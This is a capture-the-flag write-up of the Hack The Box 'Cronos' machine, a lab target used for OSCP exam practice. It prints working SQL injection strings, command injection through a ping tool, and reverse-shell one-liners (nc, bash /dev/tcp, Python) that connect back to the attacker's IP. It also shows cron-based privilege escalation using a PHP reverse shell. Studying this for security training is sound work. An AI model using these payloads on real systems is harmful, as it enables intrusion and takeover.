---
title: "Hack The Box - Cronos"
date: 2020-01-27
tags: [oscp, htb, linux]
collection: oscp-prep
published: true
layout: single
classes: wide
toc: true
toc_label: Table of Contents
headline: "DNS ZT, SQLi, and playing with cron"
picture: /assets/htb-cronos/machine_info.png
author_profile: false
---

![](/assets/htb-cronos/machine_info.png)

## Enumeration

Initial Nmap scans show only ports 22,53, and 80 open.

```
Nmap scan report for 10.10.10.13
Host is up, received user-set (0.051s latency).
Scanned at 2020-01-27 11:08:19 EST for 128s
Not shown: 65532 filtered ports
Reason: 65532 no-responses
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkOUbDfxsLPWvII72vC7hU4sfLkKVEqyHRpvPWV2+5s2S4kH0rS25C/R+pyGIKHF9LGWTqTChmTbcRJLZE4cJCCOEoIyoeXUZWMYJCqV8crflHiVG7Zx3wdUJ4yb54G6NlS4CQFwChHEH9xHlqsJhkpkYEnmKc+CvMzCbn6CZn9KayOuHPy5NEqTRIHObjIEhbrz2ho8+bKP43fJpWFEx0bAzFFGzU0fMEt8Mj5j71JEpSws4GEgMycq4lQMuw8g6Acf4AqvGC5zqpf2VRID0BDi3gdD1vvX2d67QzHJTPA5wgCk/KzoIAovEwGqjIvWnTzXLL8TilZI6/PV8wPHzn
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKWsTNMJT9n5sJr5U1iP8dcbkBrDMs4yp7RRAvuu10E6FmORRY/qrokZVNagS1SA9mC6eaxkgW6NBgBEggm3kfQ=
|   256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHBIQsAL/XR/HGmUzGZgRJe/1lQvrFWnODXvxQ1Dc+Zx
53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

> Since we can see a DNS server running, you should add `cronos.htb` to your local `/etc/hosts` file. This is a good tip anytime you encounter DNS/SSL on a CTF.

Navigating to the HTTP site on port 80 shows only the default Apache landing page.

![](/assets/htb-cronos/tcp_80_http_screenshot.png)

However, navigating to `http://cronos.htb` gives us a proper website.

![](/assets/htb-cronos/cronos_url.png)

---

## Initial Shell

### DNS Zone Transfer

Apart from the discovery of the `cronos.htb` website, directory fuzzing with gobuster/dirsearch didn't give us much else. However, since we have an open DNS server running on port 53, we can try a DNS zone transfer against it, to see if we get lucky and find a listing of sub-directories. The command `dig AXFR @10.10.10.13 cronos.htb` will run the zone transfer for us.

![](/assets/htb-cronos/zt_results.png)

We actually did get a result back, showing that `admin.cronos.htb` is a valid sub-domain. Before we can navigate to it however, we need to add it to our `/etc/hosts` file locally. You can add it to the same line as `cronos.htb`, as shown below.

![](/assets/htb-cronos/local_hosts_file.png)

### SQLi with `wfuzz`

Now that we have a new subdirectory, let's see what's running on it.

![](/assets/htb-cronos/admin_page.png)

Looks like a generic login page. Viewing a test capture via Burp, we can see that it's a simple POST request, with `username` and `password` as the fields. I bet there's a SQL injection hiding in that `username` field.

![](/assets/htb-cronos/burp_initial_post.png)

To find it, we can use `wfuzz` to work through a list of known SQL injections. The command `wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/SQL.txt -d "username=FUZZ&password=password" http://admin.cronos.htb` will kick off the tests. Let's break down the command a bit though.

- `-c` outputs the results in color, so it's easier to read.
- `-z file,/usr/share/wfuzz/wordlist/Injections/SQL.txt` tells `wfuzz` to load up the listed file as a payload to read through.
- `-d "username=FUZZ&password=password"` gives the POST request to submit. Note the FUZZ text in the `username` field, telling `wfuzz` to stick the injections in this spot.

Wfuzz results (truncated):

![](/assets/htb-cronos/wfuzz_results.png)

So we actually got a few injections that work:

- `' or 1=1 or ''='`
- `x' or 1=1 or 'x'='y`
- `' or 1=1 or ''='`
- `' or 0=0 #`

We can now try one of these injections on the admin page, in the `username` field, with anything we want in the password field, in order to login to the admin panel.

### Admin panel testing

On the admin panel, the only tool listed is a simple object that will run either a `traceroute` or `ping` against the IP we specify.

![](/assets/htb-cronos/admin_page_panel.png)

Let's test the ping command, and make sure it works against our IP. We can fire up `tcpdump -i tun0 icmp` to capture incoming `ping` traffic to our machine.

![](/assets/htb-cronos/ping_panel.png)

![](/assets/htb-cronos/ping_tcpdump.png)

So the results show that the tool will send a single ping, and we've confirmed via `tcpdump` that we can capture it locally. 

The fact that the tool only sends a single ping, tells me that it's been modified locally, since the default for a Unix system is to continuously ping until stopped. So the script on the server must be using something like `ping -c 1 $IP` in their script. We can also see that it outputs the text of the `ping` command on the page as well.

### Adding commands to `ping` tool

Since we know the server-side script is custom, na doutputs the results in text, we may be able to add additional commands to it, in order to run commands on the server. We can test this by inputting something like `10.10.14.35 && id` to the ping field on the tool. The `&&` tells the system to run the second command at the completion of the first command.

![](/assets/htb-cronos/panel_rce.png)

Sure enough, we have RCE! We can see the results of the `id` command in the page.

Now all that's left to do is exploit the RCE to gain a reverse shell. We can trest for the presense of the `nc` tool by adding `10.10.14.35 && which nc` to the tool, which will result with the path of the server-side `nc` tool.

![](/assets/htb-cronos/panel_whichnc.png)

Let's try a simple reverse shell with `10.10.14.35 && /bin/nc -e /bin/sh 10.10.14.35 7500`. Make sure you setup a local listener with `nc -lvnp 7500` to capture the shell.

We get no return on our listener, and no output on the page. So we can assume that this is probably the OpenBSD version of `nc`, which doesn't carry the `-e` option.

We can try using a pure `bash` reverse shell with `10.10.14.35 && /bin/bash -i >& /dev/tcp/10.10.14.35/7500 0>&1`, but still no luck.

Let's try to see if `python` is in the path with `10.10.14.35 && which python`.

![](/assets/htb-cronos/panel_whichpython.png)

Sure enough, we do have `python` in the path. So a `python` reverse shell should work.

We can use `10.10.14.35 && python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.35",7500));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`

![](/assets/htb-cronos/initial_shell.png)

This works! We have our initial shell back as `www-data`.

---

## Privilege Escalation

### Enumerate as `www-data`

The first thing we can do in our new shell is find the version of the OS we're using, which is Ubuntu 16.04.2, running on Linux kernel 4.4.0-72-generic.

```shell
www-data@cronos:/var/www/admin$ cat /etc/issue
cat /etc/issue
Ubuntu 16.04.2 LTS \n \l

www-data@cronos:/var/www/admin$ uname -a
uname -a
Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```

Next, we can see what users are on the system, and see if we can read the `user.txt` flag.

![](/assets/htb-cronos/user_proof.png)

So we can see that the only user on the system is `noulis`, and we can read the `user.txt` flag form their home directory.

Let's change our directory to `/tmp`, and download and run [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration), which will give us a good picture of the system form the `www-data` viewpoint. We can copy it locally to our working directory, start a HTTP server with `python -m SimpleHTTPServer`, and grab the file form the remote shell with `wget http://10.10.14.35:8000/lse.sh`. Once it's on the target, we need to make it executable with `chmod +x lse.sh`, and run it with `./lse.sh -l1`

The results are fairly long, but below is the section on `cron` jobs

![](/assets/htb-cronos/lse_cron.png)

### Writing our own artisan script

As we can see from the crontab output, that cron runs the `artisan` script as root. We can also see that the file is owned by `www-data`, which means we can simply write our own, rename it to `artisan`, and we'll be able to grab a shell as `root`.

We can use the pre-built [PHP Reverse Shell from Pentest Monkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell), rename it to `artisan`, and place it on the target in the `/var/www/laravel` folder to replace the existing script.

First, copy the file locally, and rename it `artisan`. I used `cp /opt/php-reverse-shell.php artisan`, since I have the file pre-built in my `/opt` directory.

Next, edit the file to modify the `$ip` variable to match our local machine.

Now you can go back to your remote shell, and use `wget http://10.10.14.35:8000/artisan` to download the file.

![](/assets/htb-cronos/root_wget.png)

Now just open a listener with `nc -lvnp 1234`, and wait to capture the `root` shell when the cron job runs every minute.

![](/assets/htb-cronos/root_shell.png)

Grab `root.txt`, and you're done!

![](/assets/htb-cronos/root_proof.png)




